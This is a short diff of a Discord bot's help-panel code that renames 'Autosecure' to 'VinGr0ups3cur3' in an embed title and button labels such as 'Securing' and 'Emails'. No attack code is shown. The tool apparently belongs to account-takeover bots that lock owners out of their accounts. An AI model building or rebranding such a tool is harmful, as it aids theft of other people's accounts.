@@ -2,12 +2,12 @@ const { ActionRowBuilder, ButtonBuilder, ButtonStyle, EmbedBuilder } = require('
 
 function createhelppanel() {
   const embed = new EmbedBuilder()
-    .setTitle('Autosecure info')
-    .setDescription("Select a button below to get more information on Autosecure. If you're still unsure, make a ticket\nCredit: HachiiroMC_O")
+    .setTitle('VinGr0ups3cur3 info')
+    .setDescription("Select a button below to get more information on VinGr0ups3cur3. If you're still unsure, make a ticket\nCredit: HachiiroMC_O")
     .setColor(13158600);
 
   const row1 = new ActionRowBuilder().addComponents(
-    new ButtonBuilder().setCustomId('starting_bot').setLabel('Autosecure Full Setup Guide').setStyle(ButtonStyle.Primary),
+    new ButtonBuilder().setCustomId('starting_bot').setLabel('VinGr0ups3cur3 Full Setup Guide').setStyle(ButtonStyle.Primary),
     new ButtonBuilder().setCustomId('securing').setLabel('Securing').setStyle(ButtonStyle.Primary),
     new ButtonBuilder().setCustomId('responses').setLabel('Bot responses').setStyle(ButtonStyle.Primary),
     new ButtonBuilder().setCustomId('emails').setLabel('Emails').setStyle(ButtonStyle.Primary)
